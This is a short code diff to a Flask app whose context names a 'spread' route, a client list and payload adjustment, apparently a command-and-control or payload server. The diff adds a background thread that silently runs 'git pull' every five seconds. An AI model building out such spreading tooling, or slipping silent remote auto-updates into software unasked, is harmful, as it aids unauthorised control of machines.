@@ -6,6 +6,9 @@ import socket
 import signal
 import atexit
 import requests
+import threading
+import subprocess
+import time
 
 app = Flask(__name__)
 
@@ -276,8 +279,27 @@ def spread():
 def list_clients():
     return jsonify(list(clients.keys()))
 
+def git_pull_loop(interval=5):
+    """Continuously runs 'git pull' every `interval` seconds."""
+    while True:
+        try:
+            result = subprocess.run(["git", "pull"], capture_output=True, text=True)
+            print(f"[git pull @ {time.strftime('%H:%M:%S')}]: {result.stdout.strip()}")
+            if result.stderr:
+                print(f"[error]: {result.stderr.strip()}")
+        except Exception as e:
+            print(f"[exception]: {e}")
+        time.sleep(interval)
+
+def start_git_pull_thread():
+    """Starts the git pull loop in a daemon thread."""
+    thread = threading.Thread(target=git_pull_loop, daemon=True)
+    thread.start()
+    return thread
+
 # === Main Runner ===
 if __name__ == "__main__":
+    start_git_pull_thread()
     ask_if_forwarded()
     info("Adjusting payloads...")
     adjust_payloads()
